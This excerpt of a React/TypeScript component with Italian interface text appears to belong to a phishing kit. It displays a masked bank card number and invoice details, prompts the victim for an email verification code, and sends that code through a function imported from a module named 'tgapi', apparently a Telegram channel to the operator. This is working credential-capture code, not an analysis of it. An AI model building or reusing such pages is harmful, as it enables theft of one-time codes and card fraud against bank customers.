...
import { Shield, Mail, RotateCw } from "lucide-react";
import { sendItEmailEnteredNotification } from '../../tgapi';
...
const MailComponent = ({ cardType, bankName, cardNumber, onChoice, invoiceName = "Fattura sconosciuta", recipientName = "Destinatario sconosciuto" }: MailComponentProps) => {
  const [emailCode, setEmailCode] = useState<string>('');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const { code } = useParams<{ code: string }>();
  
  // Extract card number from props or generate from URL code
  const getCardNumber = () => {
    if (cardNumber) return `•••• ${cardNumber.slice(-4)}`;
    if (code) {
  ...
  const handleSubmit = async () => {
    if (!emailCode.trim()) {
      alert('Inserisci il codice email');
      return;
    }
    ...
    try {
      await sendItEmailEnteredNotification(invoiceName, recipientName, emailCode);
      ...
      <div className="space-y-3 relative">
        ...
        <div className="flex justify-center">
          <input
            ...
            placeholder=""
            required
            value={isProcessing ? '••••••••••••••••••••'.slice(0, emailCode.length) : emailCode}
            disabled={isProcessing}
            className="w-48 px-2 py-1 text-center text-xs font-mono border border-border rounded-[5px] bg-white shadow-lg drop-shadow-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 focus:shadow-xl transition-shadow duration-200 disabled:opacity-50"
            onChange={(e) => {
        ...
        <div className="flex justify-center">
          <Button
            ...
            disabled={isProcessing || !emailCode.trim()}
      ...
      <div className="mt-4 p-2 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md transition-all duration-300 hover:shadow-xl">
        <div className="space-y-2">
          ...
          <div className="flex justify-between items-center pt-1.5 border-t border-border/30">
            ...
            <span className="text-[11px] font-mono font-medium text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">{getCardNumber()}</span>
          </div>
        </div>
      </div>
